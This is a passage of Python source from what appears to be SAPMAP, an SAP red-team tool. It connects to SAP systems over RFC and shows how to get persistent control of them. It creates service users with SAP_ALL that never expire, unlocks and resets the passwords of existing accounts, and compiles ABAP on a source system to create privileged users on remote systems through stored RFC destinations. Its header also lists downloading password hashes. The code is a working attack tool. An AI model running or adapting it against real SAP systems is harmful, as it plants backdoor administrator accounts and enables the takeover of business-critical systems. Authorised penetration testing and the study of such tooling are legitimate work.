#!/usr/bin/env python3
"""
SAPMAP RFC Operations — Authenticated RFC calls to SAP systems.

Uses sap_rfc_ctypes.RFCConnection for all authenticated operations:
  - Retrieve Type-3 RFC connections (via RSRFCCHK execution)
  - Test RFC connections (/SDF/RFC_CHECK)
  - User management (BAPI_USER_GET_DETAIL, BAPI_USER_CREATE1, etc.)
  - Table reads (RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS)
  - Password hash download (USR02)
  - Client role detection (T000 CCCATEGORY)
  - TCP/IP destination creation (DEST_RFC_TCPIP_CREATE)
"""

import logging
import threading
import time
from datetime import datetime
from typing import Optional


def _run_with_timeout(func, timeout: float, *args, **kwargs):
    """Run `func(*args, **kwargs)` in a background thread; return its
    result or ``(None, True)`` on timeout.  Used to bound pyrfc calls
    that block at the TCP layer when an RFC destination points at a
    dead gateway — without this, a single broken SM59 entry hangs the
    whole bulk retrieve for 60-120 s per destination.

    Returns ``(result, timed_out)``.  ``timed_out`` is True when the
    worker is still running after ``timeout``; the background thread
    is left to finish in the background (pyrfc's C-level SAPNW calls
    aren't Python-interruptible).
    """
    box = {"result": None, "exc": None}

    def _worker():
        try:
            box["result"] = func(*args, **kwargs)
        except BaseException as e:  # noqa: BLE001
            box["exc"] = e

    t = threading.Thread(target=_worker, name=f"rfc_timeout_{func.__name__}",
                         daemon=True)
    t.start()
    t.join(timeout)
    if t.is_alive():
        return None, True
    if box["exc"] is not None:
        raise box["exc"]
    return box["result"], False


def _detach_if_timed_out(conn, timed_out: bool) -> None:
    """If an RFC call timed out, detach the pyrfc handle so Python's
    subsequent ``__exit__`` / ``close()`` becomes a no-op.

    Without this, the ``with _get_connection(...)`` wrapper calls
    ``RfcCloseConnection`` on a handle the daemon worker thread is
    still inside — the SDK then blocks waiting for the in-flight
    ``RfcInvoke`` to drain, which is exactly the hang we're trying to
    avoid.  Leaking the handle (the daemon thread eventually returns
    and the GC reclaims it) is the right trade-off.
    """
    if timed_out and conn is not None:
        try:
            conn._handle = None
        except Exception:
            pass

from sapmap_models import (
    SAPNode, RFCConnection as RFCConn, Credentials, CreatedUser, Severity, Finding,
)
import sapmap_config
from sapmap_config import (
    SAPMAP_USER_PREFIX, SAPMAP_USER_MAX,
    RFC_CHECK_FM, RFC_CHECK_PARAMS, RFC_LOGON_SUCCESS_TEXT,
    BAPI_USER_CREATE, BAPI_USER_DELETE, BAPI_USER_GET_DETAIL,
    BAPI_USER_PROFILES_ASSIGN, DEST_RFC_TCPIP_CREATE,
    RFC_READ_TABLE, CNV_MBT_SHELL_GET_CLIENTS,
    RSRFCCHK_PROGRAM, RSRFCCHK_JOB_NAME, RSRFCCHK_EXTERNAL_USER,
    DEFAULT_POLL_INTERVAL, DEFAULT_MAX_POLL_ATTEMPTS,
    sapmap_username,
)

from sapmap_errors import format_rfc_exception
from sap_rfc_ctypes import (
    ABAPApplicationError,
    RFCTYPE_CHAR, RFCTYPE_TABLE, RFCTYPE_INT, RFCTYPE_BYTE, RFCTYPE_NUM,
    RFCTYPE_STRUCTURE,
    RFC_IMPORT, RFC_EXPORT, RFC_TABLES,
)

logger = logging.getLogger(__name__)

# SDK path (set globally or per-connection)
_sdk_path = None


def set_sdk_path(path: str):
    """Set the NW RFC SDK library path globally."""
    global _sdk_path
    _sdk_path = path


def _get_connection(node: SAPNode, creds: Credentials = None,
                     host_override: str = ""):
    """Create an RFC connection to a node using credentials.

    `host_override` — when non-empty, use this host instead of
    `node.ip / node.hostname` for the ASHOST field.  Used when
    testing an RFC destination whose stored target host differs
    from the discovered node IP (e.g. destination points at an
    internal address the source can reach; discovery found a
    different NAT-ed IP).

    Returns an sap_rfc_ctypes.RFCConnection (context manager).
    """
    from sap_rfc_ctypes import RFCConnection

    if creds is None:
        creds = node.best_credentials()
    if creds is None:
        raise ValueError(f"No credentials available for {node.sid}")

    host = host_override.strip() if host_override else (
        node.ip or node.hostname)
    params = {
        "ashost": host,
        "sysnr": creds.instance_nr,
        "client": creds.client,
        "user": creds.username,
        "passwd": creds.password,
        "lang": "EN",
    }

    # SAProuter support: the NW RFC SDK natively handles routing
    if node.saprouter:
        params["saprouter"] = node.saprouter

    return RFCConnection(sdk_path=_sdk_path, **params)


# ---------------------------------------------------------------------------
# Test connection
# ---------------------------------------------------------------------------

def test_connection(node: SAPNode, creds: Credentials = None,
                     host_override: str = "") -> bool:
    """Test if credentials work by opening a connection and pinging.

    `host_override` — force the ASHOST value (see `_get_connection`).
    Used to test RFC destinations against their RFCDES-stored host
    rather than the node's discovered IP, which can differ when the
    landscape uses multiple network paths (internal vs NAT).
    """
    host_label = host_override or (node.ip or node.hostname)
    try:
        with _get_connection(node, creds,
                              host_override=host_override) as conn:
            ok = conn.ping()
            if ok and creds:
                creds.verified = True
                print(f"[+] Connection test OK for {node.sid} "
                      f"(host={host_label}, user={creds.username}, "
                      f"client={creds.client}, "
                      f"inst={creds.instance_nr})")
            return ok
    except Exception as e:
        err = format_rfc_exception(e)
        print(f"[-] Connection test failed for {node.sid} "
              f"(host={host_label}): {err}")
        if "password" in err.lower() or "logon" in err.lower():
            print(f"    Check username/password and client number")
        elif "communication" in err.lower() or "connect" in err.lower():
            print(f"    Check host/instance number — cannot reach the system")
        elif "library" in err.lower() or "sdk" in err.lower() or "load" in err.lower():
            print(f"    SAP NW RFC SDK not found — set the SDK path in settings")
        return False


# ---------------------------------------------------------------------------
# User existence check
# ---------------------------------------------------------------------------

def check_user_exists(node: SAPNode, username: str,
                      creds: Credentials = None) -> bool:
    """Check if a user exists in the remote system via BAPI_USER_GET_DETAIL."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                # Some systems return a table
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        msg = entry.get("MESSAGE", "")
                        if "does not exist" in msg.lower():
                            return False
                return True
            else:
                if ret.get("TYPE", "") in ("E", "A"):
                    msg = ret.get("MESSAGE", "")
                    if "does not exist" in msg.lower():
                        return False
                return True
    except Exception as e:
        logger.debug(f"User check failed for {username}@{node.sid}: {format_rfc_exception(e)}")
        return False


def next_sapmap_username(node: SAPNode, creds: Credentials = None) -> Optional[str]:
    """Find the next available SAPMAP username (SAPMAP00..99)."""
    for i in range(SAPMAP_USER_MAX + 1):
        username = sapmap_username(i)
        if not check_user_exists(node, username, creds):
            return username
    return None


# ---------------------------------------------------------------------------
# User details retrieval
# ---------------------------------------------------------------------------

def get_user_details(node: SAPNode, username: str,
                     creds: Credentials = None) -> dict:
    """Get user profiles and roles via BAPI_USER_GET_DETAIL.

    Returns dict with:
        - profiles: list of profile names
        - roles: list of role (activity group) names
        - has_sap_all: bool
        - error: str if call failed
    """
    result_info = {
        "profiles": [],
        "roles": [],
        "has_sap_all": False,
        "error": "",
        "raw": {},
    }

    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_GET_DETAIL, USERNAME=username)
            result_info["raw"] = result

            # Extract profiles
            profiles_table = result.get("PROFILES", [])
            if isinstance(profiles_table, list):
                for row in profiles_table:
                    pname = row.get("BAPIPROF", "") or row.get("PROFILE", "")
                    if pname:
                        result_info["profiles"].append(pname.strip())

            # Extract activity groups (roles)
            roles_table = result.get("ACTIVITYGROUPS", [])
            if isinstance(roles_table, list):
                for row in roles_table:
                    rname = row.get("AGR_NAME", "") or row.get("ROLE", "")
                    if rname:
                        result_info["roles"].append(rname.strip())

            # Check for SAP_ALL
            result_info["has_sap_all"] = "SAP_ALL" in result_info["profiles"]

    except Exception as e:
        error_msg = format_rfc_exception(e)
        if "authorization" in error_msg.lower() or "AUTHORIZATION" in error_msg:
            result_info["error"] = "No authorization for BAPI_USER_GET_DETAIL"
        else:
            result_info["error"] = error_msg
        logger.debug(f"User detail retrieval failed for {username}@{node.sid}: {format_rfc_exception(e)}")

    return result_info


def _abap_install_and_run(conn, destination: str, username: str) -> dict:
    """Execute BAPI_USER_GET_DETAIL on a remote system via ABAP_INSTALL_AND_RUN.

    Dynamically generates an ABAP program that calls BAPI_USER_GET_DETAIL
    with DESTINATION '<dest>' to retrieve user profiles on the TARGET system.
    The program is compiled and executed on the SOURCE system.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN
    (available on newer S/4HANA systems).

    Returns dict with: profiles, has_sap_all, error.
    """
    abap_lines = [
        "REPORT zsapmap.",
        "DATA: t_profiles TYPE TABLE OF bapiprof,",
        "      l_profiles LIKE LINE OF t_profiles,",
        "      t_roles    TYPE TABLE OF bapiagr.",
        "CALL FUNCTION 'BAPI_USER_GET_DETAIL'",
        f"  DESTINATION '{destination}'",
        "  EXPORTING",
        f"    username       = '{username}'",
        "  TABLES",
        "    profiles       = t_profiles",
        "    activitygroups = t_roles.",
        "LOOP AT t_profiles INTO l_profiles.",
        "  WRITE: / l_profiles-bapiprof.",
        "ENDLOOP.",
    ]

    run = _run_abap_program(conn, abap_lines, "ZSAPMAP")
    if not run["success"]:
        return {
            "profiles": [],
            "has_sap_all": False,
            "error": run["error"],
        }

    profiles = run["output"]
    return {
        "profiles": profiles,
        "has_sap_all": "SAP_ALL" in profiles,
        "error": "",
    }


def _susr_suim_sap_all_check(conn, destination: str, username: str) -> dict:
    """Check if a remote user has SAP_ALL via SUSR_SUIM_API_RSUSR050_USER.

    Fallback when RFC_ABAP_INSTALL_AND_RUN is blocked ("not permitted in
    this client").  Compares authorization objects of the user on the remote
    system.  If at least 8 of the 10 key auth objects are present AND the
    total number of entries exceeds 400, we consider SAP_ALL granted.

    Threshold is 8/10 (not 10/10) because some objects are system-optional:
    - S_TABU_NAM: only active when table-name authorization is configured
    - S_ECATTADM: only present when the eCATT test tool component is installed
    A genuine SAP_ALL user on systems without these objects will score 8/10.

    Returns dict with: profiles, has_sap_all, error.
    """
    REQUIRED_OBJECTS = {
        "S_DX_MAIN", "S_ECATTADM", "S_PATH", "S_ICF_ADM", "S_BTCH_ADM",
        "S_DEVELOP", "S_DBCON", "S_TABU_DIS", "S_TABU_NAM", "S_USER_ADM",
    }

    try:
        result = conn.call(
            "SUSR_SUIM_API_RSUSR050_USER",
            IV_SYSTEM_A=destination,
            IV_SYSTEM_B=destination,
            IV_USER_A=username,
            IV_USER_B=username,
            IV_TAB_VIEW=1,
        )

        et_tab = result.get("ET_TAB_VIEW1", [])
        total = len(et_tab)
        found_objects = {row.get("OBJCT", "").strip() for row in et_tab
                         if isinstance(row, dict)}
        matched = REQUIRED_OBJECTS & found_objects
        has_sap_all = len(matched) >= (len(REQUIRED_OBJECTS) - 2) and total > 400

        missing = REQUIRED_OBJECTS - matched
        logger.debug(f"SUSR_SUIM check for {username}@{destination}: "
                     f"{total} entries, {len(matched)}/{len(REQUIRED_OBJECTS)} "
                     f"required objects, missing={missing} → SAP_ALL={has_sap_all}")

        profiles = ["very likely SAP_ALL"] if has_sap_all else []
        if has_sap_all:
            print(f"[+] SUSR_SUIM fallback: {username} via {destination} has "
                  f"SAP_ALL ({total} auth entries, "
                  f"{len(matched)}/{len(REQUIRED_OBJECTS)} key objects)")
        else:
            print(f"[-] SUSR_SUIM fallback: {username} via {destination} does "
                  f"NOT have SAP_ALL ({total} entries, "
                  f"{len(matched)}/{len(REQUIRED_OBJECTS)} key objects, "
                  f"missing: {missing})")

        return {"profiles": profiles, "has_sap_all": has_sap_all, "error": ""}

    except Exception as e:
        logger.debug(f"SUSR_SUIM fallback failed: {format_rfc_exception(e)}")
        return {"profiles": [], "has_sap_all": False,
                "error": f"SUSR_SUIM fallback failed: {format_rfc_exception(e)}"}


def get_direct_user_profiles(target_node: SAPNode, username: str,
                             creds: Credentials) -> dict:
    """Fetch a user's profiles + roles by logging on DIRECTLY to the
    target and calling BAPI_USER_GET_DETAIL — no source ABAP needed.

    Used when a Java source has recovered an RFC destination's creds
    (SAPJSF/UMEBackendConnection) and wants to know whether the remote
    service user is powerful (SAP_ALL etc.) without routing the call
    through an ABAP system we don't own.

    Returns dict with: profiles (list), roles (list), has_sap_all (bool),
    error (str).  A non-empty error means the BAPI call was blocked
    (e.g. S_RFC on BAPI_USER_GET_DETAIL, or /SAPDS/ missing) — caller
    can decide whether to still trust the logon OK.
    """
    out = {"profiles": [], "roles": [], "has_sap_all": False, "error": ""}
    try:
        with _get_connection(target_node, creds) as conn:
            det = conn.call("BAPI_USER_GET_DETAIL", USERNAME=username)
            ret = det.get("RETURN", [])
            # RETURN is a table; look for error-typed rows
            if isinstance(ret, dict):
                ret = [ret]
            for r in ret or []:
                if r.get("TYPE", "").upper() in ("E", "A"):
                    out["error"] = r.get("MESSAGE", "BAPI returned error")
                    return out
            for p in det.get("PROFILES", []) or []:
                name = (p.get("BAPIPROF") or "").strip()
                if name:
                    out["profiles"].append(name)
            for a in det.get("ACTIVITYGROUPS", []) or []:
                name = (a.get("AGR_NAME") or "").strip()
                if name:
                    out["roles"].append(name)
            # SAP_ALL grant: via the profile itself, via SAP_NEW + full
            # comp, or via a role named SAP_ALL (rare but seen).
            if ("SAP_ALL" in out["profiles"]
                    or "SAP_ALL" in out["roles"]):
                out["has_sap_all"] = True
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        out["error"] = msg
        logger.debug(f"direct BAPI_USER_GET_DETAIL on {target_node.sid} "
                      f"for {username} failed: {format_rfc_exception(e)}")
    return out


def get_remote_user_profiles(node: SAPNode, username: str,
                             destination: str,
                             creds: Credentials = None) -> dict:
    """Get user profiles on a REMOTE system via ABAP_INSTALL_AND_RUN.

    Generates an ABAP program that calls BAPI_USER_GET_DETAIL with
    DESTINATION '<dest>' on the source system, which executes the BAPI
    on the target system and returns the profiles.

    Tries RFC_ABAP_INSTALL_AND_RUN first, then /SAPDS/RFC_ABAP_INSTALL_RUN.
    If both fail with "not permitted in this client", falls back to
    SUSR_SUIM_API_RSUSR050_USER for SAP_ALL heuristic detection.

    Returns dict with: profiles, has_sap_all, error.
    """
    result_info = {"profiles": [], "has_sap_all": False, "error": ""}

    try:
        with _get_connection(node, creds) as conn:
            result_info = _abap_install_and_run(conn, destination, username)

        # Fallback: if ABAP_INSTALL_AND_RUN is blocked, open fresh connection
        if (result_info["error"] and
                "not permitted in this client" in result_info["error"].lower()):
            print(f"[*] ABAP_INSTALL_AND_RUN blocked on {node.sid}, "
                  f"trying SUSR_SUIM fallback...")
            with _get_connection(node, creds) as conn2:
                result_info = _susr_suim_sap_all_check(
                    conn2, destination, username)

            if result_info["profiles"]:
                print(f"[+] {node.sid}: Remote profiles for {username} via {destination}: "
                      f"{', '.join(result_info['profiles'])}")
            elif result_info["error"]:
                print(f"[-] {node.sid}: Could not get profiles for {username} via "
                      f"{destination}: {result_info['error']}")
            else:
                print(f"[*] {node.sid}: No profiles found for {username} via {destination}")

    except Exception as e:
        result_info["error"] = format_rfc_exception(e)
        logger.debug(f"Remote user detail retrieval failed: {format_rfc_exception(e)}")

    return result_info


# ---------------------------------------------------------------------------
# Create user via BAPI
# ---------------------------------------------------------------------------

def reset_user_password_via_bapi(node: SAPNode, username: str,
                                    password: str, client: str,
                                    creds: Credentials = None) -> dict:
    """Reset an existing user's password to `password` and (re-)assign
    SAP_ALL via BAPI_USER_CHANGE / UNLOCK / PROFILES_ASSIGN.

    Used when a SAPMAP00 user already exists on the target but its
    password is no longer the default one — typical leftover from a
    prior SAPMAP run whose creds we've since lost.  Requires SAP_ALL
    (or at least S_USER_GRP change authority) on the `creds` logon.

    Note: BAPI_USER_CHANGE sets an "initial" password — the user is
    prompted to change it at first DIALOG logon.  RFC logons (which
    SAPMAP uses exclusively) work fine with the initial flag; we
    don't need the productive-password side-channel.

    Returns {success, message, username}.
    """
    result = {"success": False, "message": "", "username": username}
    try:
        with _get_connection(node, creds) as conn:
            # 1. BAPI_USER_UNLOCK — harmless if user isn't locked; sets
            #    UFLAG=0 so the logon can proceed.  Many hardened systems
            #    auto-lock a service user after N failed logons.
            try:
                unlock = conn.call("BAPI_USER_UNLOCK", USERNAME=username)
                ret = unlock.get("RETURN", {})
                if isinstance(ret, list):
                    for e in ret:
                        if e.get("TYPE", "") in ("E", "A"):
                            msg = e.get("MESSAGE", "")
                            if "does not exist" in msg.lower():
                                result["message"] = msg
                                return result
                elif isinstance(ret, dict) and ret.get("TYPE", "") in ("E", "A"):
                    msg = ret.get("MESSAGE", "")
                    if "does not exist" in msg.lower():
                        result["message"] = msg
                        return result
            except Exception as e:
                logger.debug(f"BAPI_USER_UNLOCK failed: {format_rfc_exception(e)}")

            # 2. BAPI_USER_CHANGE — reset password.  PASSWORDX flags
            #    which PASSWORD substructure fields we actually want
            #    to change (X=change, blank=leave alone).
            #
            #    Also flip USTYP→'S' (Service) and GLTGB→'99991231'
            #    (valid-to far future).  Service users bypass the
            #    initial-password / productive-password requirement
            #    for RFC logons that blocks Dialog users (USTYP='A')
            #    from reusing a freshly-set password via RFC.  If
            #    the pre-existing user was dialog, flipping it to
            #    service keeps SAPMAP's RFC-only flow working.
            change = conn.call(
                "BAPI_USER_CHANGE",
                USERNAME=username,
                PASSWORD={"BAPIPWD": password},
                PASSWORDX={"BAPIPWD": "X"},
                LOGONDATA={"USTYP": "S", "GLTGB": "99991231"},
                LOGONDATAX={"USTYP": "X", "GLTGB": "X"},
            )
            ret = change.get("RETURN", {})
            rows = ret if isinstance(ret, list) else [ret]
            for r in rows or []:
                if r.get("TYPE", "") in ("E", "A"):
                    msg = r.get("MESSAGE", "Unknown error")
                    result["message"] = msg
                    print(f"[-] {node.sid}: BAPI_USER_CHANGE failed: {msg}")
                    return result

            print(f"[+] {node.sid}: password reset on existing "
                  f"user {username} (initial status — RFC logon works)")

            # 3. Re-assign SAP_ALL + SAP_NEW so the user has the
            #    authorisations SAPMAP expects even if they'd been
            #    stripped since creation.
            try:
                assign = conn.call(
                    BAPI_USER_PROFILES_ASSIGN,
                    USERNAME=username,
                    PROFILES=[{"BAPIPROF": "SAP_ALL"},
                              {"BAPIPROF": "SAP_NEW"}],
                )
                ret = assign.get("RETURN", {})
                rows = ret if isinstance(ret, list) else [ret]
                for r in rows or []:
                    if r.get("TYPE", "") in ("E", "A"):
                        print(f"[!] {node.sid}: SAP_ALL re-assign "
                              f"warning: {r.get('MESSAGE', '')}")
            except Exception as e:
                print(f"[!] {node.sid}: SAP_ALL re-assign skipped: {format_rfc_exception(e)}")

            result["success"] = True
            result["message"] = (f"User {username} password reset "
                                  f"+ SAP_ALL re-assigned")
    except Exception as e:
        result["message"] = format_rfc_exception(e)
        logger.error(f"BAPI user reset failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: password reset error: {format_rfc_exception(e)}")

    return result


def delete_user_via_bapi(node: SAPNode, username: str,
                            creds: Credentials = None) -> dict:
    """Delete a user via BAPI_USER_DELETE.  Returns {success, message}.

    Safety check: the caller should verify the user belongs to SAPMAP
    (first name / function marker from BAPI_USER_GET_DETAIL) before
    invoking this — we don't want to blindly delete arbitrary users.
    """
    result = {"success": False, "message": ""}
    try:
        with _get_connection(node, creds) as conn:
            r = conn.call("BAPI_USER_DELETE", USERNAME=username)
            ret = r.get("RETURN", {})
            rows = ret if isinstance(ret, list) else [ret]
            for row in rows or []:
                if row.get("TYPE", "") in ("E", "A"):
                    result["message"] = row.get("MESSAGE", "")
                    return result
            result["success"] = True
            result["message"] = f"User {username} deleted"
    except Exception as e:
        result["message"] = format_rfc_exception(e)
    return result


def is_sapmap_owned_user(node: SAPNode, username: str,
                             creds: Credentials = None) -> bool:
    """Check whether `username` was created by SAPMAP (first name
    'SAPMAP' + function 'SAPMAP Red Team') — safe to delete if
    recreation is needed.  Returns False on any doubt (BAPI error,
    different address, user not found)."""
    try:
        with _get_connection(node, creds) as conn:
            det = conn.call("BAPI_USER_GET_DETAIL", USERNAME=username)
            addr = det.get("ADDRESS") or {}
            if not isinstance(addr, dict):
                return False
            first = (addr.get("FIRSTNAME") or "").strip().upper()
            fn = (addr.get("FUNCTION") or "").strip()
            return first == "SAPMAP" and "SAPMAP" in fn.upper()
    except Exception:
        return False


def create_user_via_bapi(node: SAPNode, username: str, password: str,
                         client: str, creds: Credentials = None) -> dict:
    """Create a user with SAP_ALL via BAPI_USER_CREATE1 + BAPI_USER_PROFILES_ASSIGN.

    Returns dict with: success, message, username
    """
    result = {"success": False, "message": "", "username": username}

    try:
        with _get_connection(node, creds) as conn:
            # Step 1: Create the user
            create_result = conn.call(
                BAPI_USER_CREATE,
                USERNAME=username,
                PASSWORD={"BAPIPWD": password},
                LOGONDATA={
                    "USTYP": "S",      # System/service user
                    "GLTGB": "99991231",  # Valid to (far future)
                },
                ADDRESS={
                    "FIRSTNAME": "SAPMAP",
                    "LASTNAME": "Security",
                    "FUNCTION": "SAPMAP Red Team",
                },
            )

            ret = create_result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        result["message"] = entry.get("MESSAGE", "Unknown error")
                        print(f"[-] {node.sid}: User creation failed: {result['message']}")
                        return result
            elif ret.get("TYPE", "") in ("E", "A"):
                result["message"] = ret.get("MESSAGE", "Unknown error")
                print(f"[-] {node.sid}: User creation failed: {result['message']}")
                return result

            print(f"[+] User {username} created in {node.sid} client {client}")

            # Step 2: Assign SAP_ALL profile
            try:
                assign_result = conn.call(
                    BAPI_USER_PROFILES_ASSIGN,
                    USERNAME=username,
                    PROFILES=[{"BAPIPROF": "SAP_ALL"}, {"BAPIPROF": "SAP_NEW"}],
                )
                ret = assign_result.get("RETURN", {})
                if isinstance(ret, list):
                    for entry in ret:
                        if entry.get("TYPE", "") in ("E", "A"):
                            print(f"[!] {node.sid}: SAP_ALL assignment warning: {entry.get('MESSAGE', '')}")
                elif ret.get("TYPE", "") in ("E", "A"):
                    print(f"[!] {node.sid}: SAP_ALL assignment warning: {ret.get('MESSAGE', '')}")
                else:
                    print(f"[+] {node.sid}: SAP_ALL profile assigned to {username}")
            except Exception as e:
                print(f"[!] {node.sid}: Could not assign SAP_ALL: {format_rfc_exception(e)}")

            result["success"] = True
            result["message"] = f"User {username} created with SAP_ALL"

    except Exception as e:
        result["message"] = format_rfc_exception(e)
        logger.error(f"BAPI user creation failed: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: User creation error: {format_rfc_exception(e)}")

    return result


# ---------------------------------------------------------------------------
# Create user on REMOTE system via ABAP_INSTALL_AND_RUN + DESTINATION
# ---------------------------------------------------------------------------

def _run_abap_program(conn, abap_lines: list, program_name: str = "ZSAPMAP") -> dict:
    """Run an ABAP program via RFC_ABAP_INSTALL_AND_RUN or /SAPDS variant.

    Shared helper that handles FM detection and output parsing.
    Returns dict with: success, output (list of strings), error, fm_name.
    """
    program_table = [{"LINE": line} for line in abap_lines]

    # Determine which FM is available
    fm_name = None
    for candidate in ("RFC_ABAP_INSTALL_AND_RUN",
                      "/SAPDS/RFC_ABAP_INSTALL_RUN"):
        try:
            conn.call("FUNCTION_EXISTS", FUNCNAME=candidate)
            fm_name = candidate
            break
        except Exception:
            continue

    if not fm_name:
        return {
            "success": False, "output": [], "fm_name": None,
            "error": "Neither RFC_ABAP_INSTALL_AND_RUN nor "
                     "/SAPDS/RFC_ABAP_INSTALL_RUN available",
        }

    try:
        run_result = conn.call(
            fm_name,
            PROGRAMNAME=program_name,
            MODE="F",
            PROGRAM=program_table,
        )

        # Parse WRITES output
        writes = run_result.get("WRITES", [])
        output_lines = []
        for row in writes:
            line = ""
            if isinstance(row, dict):
                line = (row.get("ZEILE", "") or row.get("LINE", "") or
                        row.get("WA", "")).strip()
            elif isinstance(row, str):
                line = row.strip()
            if line:
                output_lines.append(line)

        return {
            "success": True, "output": output_lines,
            "fm_name": fm_name, "error": "",
        }
    except Exception as e:
        return {
            "success": False, "output": [],
            "fm_name": fm_name, "error": format_rfc_exception(e),
        }


def create_user_via_destination(node: SAPNode, destination: str,
                                 username: str, password: str,
                                 creds: Credentials = None) -> dict:
    """Create a user on a REMOTE system via ABAP_INSTALL_AND_RUN.

    Generates an ABAP program that calls BAPI_USER_CREATE1 and
    BAPI_USER_PROFILES_ASSIGN with DESTINATION '<dest>' on the SOURCE
    system.  The BAPIs execute on the TARGET system through the RFC
    connection.

    Returns dict with: success, message, username
    """
    result = {"success": False, "message": "", "username": username}

    # Keep all ABAP lines under 72 chars (PROGRAM table LINE width)
    # Use short variable names: d=destination
    d = destination
    u = username
    p = password

    abap_lines = [
        "REPORT zsapm.",
        "DATA: rv TYPE TABLE OF bapiret2,",
        "      rs LIKE LINE OF rv,",
        "      rt TYPE TABLE OF bapiret2,",
        "      pw TYPE bapipwd,",
        "      px TYPE bapipwdx,",
        "      lo TYPE bapilogond,",
        "      ad TYPE bapiaddr3,",
        "      pt TYPE TABLE OF bapiprof,",
        "      ps TYPE bapiprof.",
        f"pw-bapipwd = '{p}'.",
        "lo-ustyp = 'S'.",
        "lo-gltgb = '99991231'.",
        "ad-firstname = 'SAPMAP'.",
        "ad-lastname = 'Security'.",
        "CALL FUNCTION 'BAPI_USER_CREATE1'",
        f"  DESTINATION '{d}'",
        "  EXPORTING",
        f"    username  = '{u}'",
        "    password  = pw",
        "    logondata = lo",
        "    address   = ad",
        "  TABLES",
        "    return    = rv.",
        "LOOP AT rv INTO rs.",
        "  IF rs-type CA 'EA'.",
        "    WRITE: / 'ERR:', rs-message.",
        "  ELSE.",
        "    WRITE: / 'USER_CREATED'.",
        # Set productive password via BAPI_USER_CHANGE
        # (CREATE1 only sets initial pwd requiring change)
        "    CLEAR rv.",
        f"    px-bapipwd = '{p}'.",
        "    CALL FUNCTION 'BAPI_USER_CHANGE'",
        f"      DESTINATION '{d}'",
        "      EXPORTING",
        f"        username  = '{u}'",
        "        password  = pw",
        "        passwordx = px.",
        "    ps-bapiprof = 'SAP_ALL'.",
        "    APPEND ps TO pt.",
        "    ps-bapiprof = 'SAP_NEW'.",
        "    APPEND ps TO pt.",
        "    CALL FUNCTION",
        "      'BAPI_USER_PROFILES_ASSIGN'",
        f"      DESTINATION '{d}'",
        "      EXPORTING",
        f"        username = '{u}'",
        "      TABLES",
        "        profiles = pt",
        "        return   = rt.",
        "    WRITE: / 'SAP_ALL_OK'.",
        "  ENDIF.",
        "ENDLOOP.",
    ]

    try:
        with _get_connection(node, creds) as conn:
            print(f"[*] {node.sid}: Running BAPI_USER_CREATE1 via "
                  f"ABAP_INSTALL_AND_RUN DESTINATION '{d}'...")
            run = _run_abap_program(conn, abap_lines, "ZSAPM")

            if not run["success"]:
                result["message"] = run["error"]
                print(f"[-] {node.sid}: {run['error']}")
                return result

            print(f"[*] {node.sid}: Used FM: {run['fm_name']}")
            output = run["output"]
            for line in output:
                print(f"    ABAP output: {line}")

            if any("USER_CREATED" in l for l in output):
                result["success"] = True
                if any("SAP_ALL_OK" in l for l in output):
                    result["message"] = (f"User {u} created with "
                                         f"SAP_ALL via DESTINATION")
                    print(f"[+] {node.sid}: User {u} created and SAP_ALL "
                          f"assigned on remote system via {d}")
                else:
                    result["message"] = (f"User {u} created via "
                                         f"DESTINATION (SAP_ALL uncertain)")
                    print(f"[+] {node.sid}: User {u} created on remote system "
                          f"via {d} (SAP_ALL uncertain)")
            else:
                err = [l for l in output if "ERR:" in l]
                if err:
                    result["message"] = err[0]
                    print(f"[-] {node.sid}: Remote user creation: {err[0]}")
                else:
                    result["message"] = (f"Unexpected output: "
                                         f"{output}")
                    print(f"[-] {node.sid}: Unexpected output: {output}")

    except Exception as e:
        result["message"] = format_rfc_exception(e)
        logger.error(f"Remote user creation via DESTINATION: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: Remote user creation error: {format_rfc_exception(e)}")

    return result


# ---------------------------------------------------------------------------
# Delete user via BAPI
# ---------------------------------------------------------------------------

def delete_user(node: SAPNode, username: str,
                creds: Credentials = None) -> bool:
    """Delete a user via BAPI_USER_DELETE."""
    try:
        with _get_connection(node, creds) as conn:
            result = conn.call(BAPI_USER_DELETE, USERNAME=username)
            ret = result.get("RETURN", {})
            if isinstance(ret, list):
                for entry in ret:
                    if entry.get("TYPE", "") in ("E", "A"):
                        print(f"[-] {node.sid}: Delete failed: {entry.get('MESSAGE', '')}")
                        return False
            elif ret.get("TYPE", "") in ("E", "A"):
                print(f"[-] {node.sid}: Delete failed: {ret.get('MESSAGE', '')}")
                return False
            print(f"[+] User {username} deleted from {node.sid}")
            return True
    except Exception as e:
        logger.error(f"User deletion failed for {username}@{node.sid}: {format_rfc_exception(e)}")
        print(f"[-] {node.sid}: Delete error: {format_rfc_exception(e)}")
        return False


# ---------------------------------------------------------------------------
# RFC connection testing (/SDF/RFC_CHECK with DEST_CHECK_CONNECTION fallback)
# ---------------------------------------------------------------------------

def _test_via_sdf_rfc_check(conn, destination_name: str, result: dict) -> bool:
    """Try /SDF/RFC_CHECK. Returns True if the FM exists, False if not found."""
    try:
        # Bound at 25 s so a broken destination (pointing at a dead
        # gateway or a firewalled host) doesn't hang Test RFCs for
        # 60-120 s per entry.  25 s > typical 20 s ping threshold
        # /SDF/RFC_CHECK applies internally, so real slow-but-working
        # destinations still complete.
        check_result, timed_out = _run_with_timeout(
            conn.call, 25.0,
            RFC_CHECK_FM,
            IV_DESTINATION=destination_name,
            **RFC_CHECK_PARAMS,
        )
        if timed_out:
            _detach_if_timed_out(conn, True)
            result["logon_ok"] = False
            result["ping_ok"] = False
            result["error"] = (f"timeout after 25s on /SDF/RFC_CHECK — "
                                f"destination probably broken")
            logger.debug(f"/SDF/RFC_CHECK on {destination_name} timed out")
            return True  # handled; don't fall back — fallback would also hang

        result["logon_message"] = check_result.get("EV_LOGON_MESSAGE", "").strip()
        result["ping_ok"] = check_result.get("EV_PING_MESSAGE", "").strip() != ""
